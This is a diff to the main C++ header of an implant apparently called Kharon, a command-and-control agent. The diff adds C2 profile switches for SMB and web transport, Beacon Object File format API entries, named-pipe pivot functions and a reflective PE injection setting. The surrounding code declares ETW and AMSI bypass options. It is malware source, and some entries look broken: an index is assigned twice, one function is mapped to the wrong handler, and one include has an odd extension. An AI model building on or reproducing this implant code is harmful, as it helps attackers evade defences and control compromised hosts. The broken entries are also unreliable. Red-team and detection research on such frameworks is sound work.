@@ -7,10 +7,11 @@
 #include <winsock.h>
 #include <ktmw32.h>
 #include <stdio.h>
+#include <aclapi.h>
 #include <ws2tcpip.h>
 
 namespace mscorlib {
-    #include <Mscoree.h>
+    #include <Mscoree.hh>
 }
 
 #include <Clr.h>
@@ -32,6 +33,9 @@ EXTERN_C UPTR StartPtr();
 EXTERN_C UPTR EndPtr();
 
 /* ========= [ Config ] ========= */
+
+#define PROFILE_SMB 0x15
+#define PROFILE_WEB 0x25
 
 #define KH_JOB_TERMINATE  0x010
 #define KH_JOB_SUSPENDED  0x100
@@ -72,6 +76,10 @@ EXTERN_C UPTR EndPtr();
 #define KH_BYPASS_ALL  0x100
 #define KH_BYPASS_ETW  0x400
 #define KH_BYPASS_AMSI 0x700
+
+#ifndef PROFILE_C2
+#define PROFILE_C2 0
+#endif 
 
 #ifndef KH_HARDWARE_BREAKPOINT_BYPASS_DOTNET
 #define KH_HARDWARE_BREAKPOINT_BYPASS_DOTNET KH_BYPASS_NONE
@@ -957,19 +965,26 @@ public:
         ApiTable[4]  = { Hsh::Str("BeaconDataLength"),       reinterpret_cast<PVOID>(&Coff::DataLength) },
         ApiTable[5]  = { Hsh::Str("BeaconOutput"),           reinterpret_cast<PVOID>(&Coff::Output) },
         ApiTable[6]  = { Hsh::Str("BeaconPrintf"),           reinterpret_cast<PVOID>(&Coff::Printf) },
-        // ApiTable[7]  = { Hsh::Str("BeaconInformation"),      reinterpret_cast<PVOID>(&Coff::Information) },
-        // ApiTable[8]  = { Hsh::Str("BeaconAddValue"),         reinterpret_cast<PVOID>(&Coff::AddValue) },
-        // ApiTable[9]  = { Hsh::Str("BeaconGetValue"),         reinterpret_cast<PVOID>(&Coff::GetValue) },
-        // ApiTable[10] = { Hsh::Str("BeaconRemoveValue"),      reinterpret_cast<PVOID>(&Coff::RmValue) },
+        // ApiTable[7]  = { Hsh::Str("BeaconInformation"),   reinterpret_cast<PVOID>(&Coff::Information) },
+        // ApiTable[8]  = { Hsh::Str("BeaconAddValue"),      reinterpret_cast<PVOID>(&Coff::AddValue) },
+        // ApiTable[9]  = { Hsh::Str("BeaconGetValue"),      reinterpret_cast<PVOID>(&Coff::GetValue) },
+        // ApiTable[10] = { Hsh::Str("BeaconRemoveValue"),   reinterpret_cast<PVOID>(&Coff::RmValue) },
         ApiTable[11] = { Hsh::Str("BeaconVirtualAlloc"),     reinterpret_cast<PVOID>(&Coff::VirtualAlloc) },
         ApiTable[12] = { Hsh::Str("BeaconVirtualProtect"),   reinterpret_cast<PVOID>(&Coff::VirtualProtect) },
         ApiTable[13] = { Hsh::Str("BeaconVirtualAllocEx"),   reinterpret_cast<PVOID>(&Coff::VirtualAllocEx) },
         ApiTable[14] = { Hsh::Str("BeaconVirtualProtectEx"), reinterpret_cast<PVOID>(&Coff::VirtualProtectEx) },
-        // ApiTable[15] = { Hsh::Str("BeaconIsAdmin"),          reinterpret_cast<PVOID>(&Coff::IsAdmin) },
-        // ApiTable[16] = { Hsh::Str("BeaconRevertToken"),      reinterpret_cast<PVOID>(&Coff::RevertToken) },
+        // ApiTable[15] = { Hsh::Str("BeaconIsAdmin"),       reinterpret_cast<PVOID>(&Coff::IsAdmin) },
+        // ApiTable[16] = { Hsh::Str("BeaconRevertToken"),   reinterpret_cast<PVOID>(&Coff::RevertToken) },
         ApiTable[17] = { Hsh::Str("BeaconOpenProcess"),      reinterpret_cast<PVOID>(&Coff::OpenProcess) },
         ApiTable[18] = { Hsh::Str("BeaconOpenThread"),       reinterpret_cast<PVOID>(&Coff::OpenThread) },
-        // ApiTable[19] = { Hsh::Str("BeaconGetSpawnTo"),       reinterpret_cast<PVOID>(&Coff::GetSpawn) },
+        // ApiTable[19] = { Hsh::Str("BeaconGetSpawnTo"),    reinterpret_cast<PVOID>(&Coff::GetSpawn) },
+        ApiTable[18] = { Hsh::Str("BeaconFormatAlloc"),      reinterpret_cast<PVOID>(&Coff::FmtAlloc) },
+        ApiTable[20] = { Hsh::Str("BeaconFormatAppend"),     reinterpret_cast<PVOID>(&Coff::FmtAppend) },
+        ApiTable[21] = { Hsh::Str("BeaconFormatFree"),       reinterpret_cast<PVOID>(&Coff::FmtFree) },
+        ApiTable[22] = { Hsh::Str("BeaconFormatToString"),   reinterpret_cast<PVOID>(&Coff::FmtToString) },
+        ApiTable[23] = { Hsh::Str("BeaconFormatInt"),        reinterpret_cast<PVOID>(&Coff::FmtFree) },
+        ApiTable[24] = { Hsh::Str("BeaconFormatPrintf"),     reinterpret_cast<PVOID>(&Coff::FmtPrintf) },
+        ApiTable[25] = { Hsh::Str("BeaconFormatReset"),      reinterpret_cast<PVOID>(&Coff::FmtReset) },
     };
 
     auto Add(
@@ -1701,7 +1716,7 @@ private:
 public:
     Transport( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
 
-#ifdef PROFILE_WEB
+#if PROFILE_C2 == PROFILE_WEB
     struct {
         PWCHAR Host;
         ULONG  Port;
@@ -1743,13 +1758,37 @@ public:
         }
     };
 
-#ifdef PROFILE_SMB
+
     struct {
-        PCHAR Name;
+        PVOID  Node;
+// #if PROFILE_C2 == PROFILE_SMB
+        PCHAR  Name;
+        HANDLE Handle;
+// #endif
     } Pipe = {
+        .Node = nullptr,
+// #if PROFILE_C2 == PROFILE_SMB
         .Name = SMB_PIPE_NAME
+// #endif
     };
-#endif // PROFILE_SMB
+
+    auto SmbAdd(
+        _In_ CHAR* NamedPipe,
+        _In_ PVOID Parser,
+        _In_ PVOID Package
+    ) -> PVOID;
+
+    auto SmbRm(
+        _In_ PVOID SmbData
+    ) -> BOOL;
+
+    auto SmbGet(
+        _In_ CHAR* SmbUUID
+    ) -> PVOID;
+
+    auto SmbList(
+        VOID
+    ) -> PVOID;
 
     auto Checkin(
         VOID
@@ -2242,7 +2281,7 @@ public:
         BOOL Spawn;
 
     } Ctx = {
-        .PE = { .TechniqueID = KH_INJECTION_PE },
+        .PE = { .TechniqueID = PeReflection },
         .Sc = { .TechniqueID = KH_INJECTION_SC }
     };
 
